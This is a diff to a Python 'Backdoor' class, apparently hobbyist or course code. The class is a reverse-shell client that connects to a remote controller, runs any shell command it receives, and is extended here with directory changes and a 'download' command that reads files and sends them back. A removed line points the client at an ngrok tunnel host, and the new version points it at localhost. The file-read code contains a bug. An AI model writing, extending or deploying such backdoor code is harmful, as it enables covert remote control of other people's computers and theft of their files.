@@ -1,5 +1,6 @@
 import socket, json
 import subprocess
+import os
 
 
 class Backdoor:
@@ -26,18 +27,37 @@ class Backdoor:
         except:
             pass
 
+    def change_working_directory_to(self, path):
+        try:
+            os.chdir(path)
+            return "[+] Changing working directory to " + path
+        except:
+            return f"[-] No such file or directory: '{path}'"
+        
+    def read_file(self, path):
+        try:
+            with open(path, "rb") as file:
+                return bytes(file.read(), "utf-8")
+        except:
+            self.reliable_send(f"[-] No such file or directory: '{path}'")
+
     def run(self):
         while True:
             command = str(self.reliable_recive())
-            command_result = self.execute_system_command(command)
-            if command_result:
-                self.reliable_send(command_result)
+            if command.split()[0] == "exit":
+                self.connection.close()
+                exit()
+            elif command.split()[0] == "cd" and len(command) >= 2:
+                command_result = self.change_working_directory_to(command.split()[1])
+            elif command.split()[0] == "download":
+                command_result = self.read_file(command.split()[1])
             else:
-                self.reliable_send('done')
+                command_result = self.execute_system_command(command)          
+            
+            self.reliable_send(command_result)
 
-        connection.close()
 
-my_backdoor = Backdoor("http://47ff-194-44-57-222.ngrok.io", 4444)
+my_backdoor = Backdoor("localhost", 4444)
 my_backdoor.run()
 
 
